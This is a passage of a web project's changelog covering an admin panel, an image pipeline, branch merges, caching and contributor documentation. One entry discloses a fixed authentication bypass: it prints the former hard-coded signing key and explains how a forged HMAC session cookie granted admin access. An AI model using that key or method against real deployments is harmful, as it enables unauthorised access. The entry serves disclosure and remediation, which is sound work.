  The first draft claimed `public/v`, `prepare:variants` and a 98-page build,
  all of which live only on that branch - `master` builds 65 pages and has no
  image pipeline. Re-check those numbers when the branch merges.

### Migration steps for the second developer now cover the admin credentials
- **What** `CONTRIBUTING.md` gains three steps: `npm install` (sharp moved to
  `dependencies`), the first `npm run build` that creates `public/v`, and
  generating `ADMIN_SECRET` / `ADMIN_PASSWORD_HASH` locally.
- **Why** The migration was written before the admin panel failed closed. A
  developer following the old steps would land on a working site with a dead
  `/admin` and no clue why, since the reason only appears in the server log.
- **Watch** Those values are per machine. `.env.local` is git-ignored, so they
  are never shared between developers, and production must not reuse a local
  one.
### Uploaded article images are resized, and a data-URI fallback is gone
- **What** Admin uploads are now resized to 1600px WebP on the way in, `sharp`
  moved to `dependencies`, the public article page routes pipeline-published
  images through `next/image`, and the nine `no-img-element` / unused-variable
  warnings are cleared.
- **Why** Two of the warnings were pointing at real defects. Uploads were stored
  untouched at up to 10 MB and rendered full size on a public page. And a failed
  upload silently stored the `readAsDataURL` preview as the image source - a
  10 MB photo becomes ~13 MB of base64, written into the tracked
  `custom-articles.json` and served inline in public HTML. It looked correct in
  the editor, because the browser that made the data URI can always render it.
- **Watch** The public page picks per image on purpose: a path the manifests
  know gets `next/image` with looked-up dimensions and the same className, so
  the layout is unchanged; uploads and pasted remote URLs keep a plain `<img>`,
  because through the pass-through loader `next/image` would emit a srcset of
  identical URLs or need `unoptimized`, gaining nothing. The remaining `<img>`
  uses each carry an inline reason - do not "fix" them without reading it.

### Published rewritten wardrobe and kitchen guides in custom articles
- **What** Added rewritten, authoritative versions of `ukuran-ideal-lemari-pakaian` and `ergonomi-dan-layout-kitchen` to `src/data/custom-articles.json`.
- **Why** Replaced baseline stubs with 10-block guides covering ergonomics, optimal cabinet clearances, and workflow triangles.
- **Watch** `src/data/custom-articles.json` is modified at runtime by `/admin`. Changes here are deployed content and take precedence over baseline articles.

### Closed an authentication bypass in the admin panel
- **What** Removed every credential default from `src/lib/auth.ts`, split the
  session signing key from the password, bounded the session timestamp at both
  ends, and added `npm run admin:secret` / `npm run admin:password` plus
  scrypt-hashed password storage.
- **Why** `ADMIN_PASSWORD` defaulted to a literal in the source and the signing
  key defaulted to that literal plus a fixed suffix. The repository is public
  and none of the variables were set, so the key was the public constant
  `niscala2026_salt_niscala`. Anyone could compute
  `<timestamp>.HMAC(timestamp, key)`, set the session cookie, and hold a full
  admin session without touching the login form - which meant the rate limiter
  never saw them. Verified by forging a token and using it; the admin list
  returned 72 KB with four articles. After the fix the same token returns a
  response byte-identical to sending no cookie at all.
- **Watch** Three things a later change can get wrong here.
  (1) `isAdminAuthenticated()` denies rather than throws when the config is
  missing, on purpose: throwing would fail `next build` and turn a
  misconfiguration into a dead site instead of a disabled panel. Verified the
  build still succeeds with no admin variables set.
  (2) scrypt, not bcrypt or argon2, because those are native addons and a build
  on this host has already died over a native binary and an old glibc.
  (3) The scrypt cost parameters live *inside* the hash string. Keeping them as
  a shared constant is what broke the first attempt - the generator used
  N=32768 while the verifier fell through to Node's default of 16384, and the
  correct password was rejected.

### Agent and contributor documentation
- **What** Added `CHANGELOG.md`, `CONTRIBUTING.md`, and a project-rules section
  in `AGENTS.md` covering commands, document ownership, and the traps that have
  already cost time.
- **Why** Two developers and several agents were each re-deriving the same
  constraints. `CODEX_MEMORY.md` had already gone stale — it still described a
  Turbopack build and knew nothing about the admin panel or the image loader.
- **Watch** `AGENTS.md` is loaded automatically by Claude Code via `CLAUDE.md`
  and read directly by other agents, so it is the only file guaranteed to be
  seen. Anything an agent must not get wrong belongs there, not here.

### Merged the admin-panel branch
- **What** Brought Developer B's four commits (article admin panel, login,
  editor, image and YouTube embeds) into `master`, then merged `master` into
  `feat/optimasi-gambar`. Five files conflicted and were resolved by taking
  whichever side was more complete per hunk.
- **Why** The two branches had diverged from `afc8d4e` and both had touched the
  homepage sections while independently fixing the same mobile problems.
- **Watch** `sticky-mobile-cta.tsx` merged with **no** conflict and was broken
  anyway: an early `/admin` return landed above a `useEffect`, leaving a
  conditional hook that throws on navigation out of `/admin`. Lint caught it,
  git could not. A clean merge here is not evidence of a working merge — run
  `npm run lint` and `npm run build` after every merge.

### Kept `--text-display-mobile` at 40px
- **What** Declined the admin branch's 34px for this token.
- **Why** `--text-headline-lg-mobile` is 36px. At 34px the largest step in the
  scale renders smaller than the step beneath it, everywhere the token is used —
  hero, closing CTA, CTA banner.
- **Watch** Both branches were chasing the same goal, a hero that does not push
  the proof bar below the fold on a 360px phone. If the hero specifically needs
  to be smaller, that belongs on the hero's own class.

### Pre-rendered responsive image variants; runtime optimiser off
- **What** `scripts/build-image-variants.mjs` writes every width in the ladder
  into `public/v` before the build. A custom `next/image` loader
  (`src/lib/image-loader.ts`) points at those files. `/_next/image` now 404s.
- **Why** On Hostinger shared hosting a cold `/_next/image` request measured
  **1.8–2.8s TTFB** because `sharp` encoded on demand, and the cache behind it
  lives in `.next/cache/images`, which every rebuild wipes — so the first
  visitor after each deploy paid it again. The same request now serves in
  **23ms**.
- **Watch** WebP only, deliberately. Measured on this project's own photography
  at 1280px: webp 202ms / 79.6 KB against avif 5081ms / 65.5 KB. AVIF is 25×
  slower to encode for 18% fewer bytes, which is a 45-minute build instead of a
  1-minute one. Do not "improve" this by re-enabling AVIF without re-measuring
  on the target host.

### Hard-linked the duplicate top ladder rung
- **What** Ladder steps at or above a source's own width are copied once and
  hard-linked thereafter, with a copy fallback.
- **Why** 227 of 232 sources are 1280px wide or narrower, so the 1600 rung was a
  byte-for-byte duplicate of 1280. The tree went from 63.2 MB to 39.9 MB.
- **Watch** Uploading over FTP expands links back into files. The saving is real
  only when the build runs on the server.

### Blur placeholders via `placeholder`, not `placeholder="blur"`
- **What** `npm run prepare:blur` writes a 16px LQIP into the manifests;
  `src/lib/image-placeholder.ts` passes it as a `data:` URI.
- **Why** `placeholder="blur"` wraps the URI in an inline SVG carrying two
  `feGaussianBlur` passes, a `feColorMatrix` and two `feComposite` nodes — about
  1 KB per image, repeated in the flight payload. That more than doubled
  `/portfolio`. Passing the URI directly paints it as a plain background, and
  the browser's own upscaling supplies the blur the filter was faking.
- **Watch** Roughly 150 bytes per image either way; the SVG is the expensive
  part, not the placeholder.

### Spelled out `sizes` instead of approximating with `vw`
- **What** Portfolio grids declare real slot widths.
- **Why** `30vw` was a stand-in for the container arithmetic and drifted on wide
  screens: the container caps at 1440px with 64px gutters, so a card is 416px on
  a 1920px display, not 576px.
- **Watch** Next narrows a srcset only when `sizes` contains a bare integer
  `vw` preceded by whitespace — its regex is `/(^|\s)(1?\d?\d)vw/`. A `calc()`
  disables that narrowing, so all ladder widths are offered. Measured cost:
  1.1 KB gzipped, accepted so low-DPR phones keep the small variants.

### Long-lived caching for images
- **What** `/images`, `/logo` and `/v` are served `immutable` for a year.
- **Why** The host returned them with no `Cache-Control` at all, so browsers
  fell back to heuristic caching and revalidated far more often than needed.
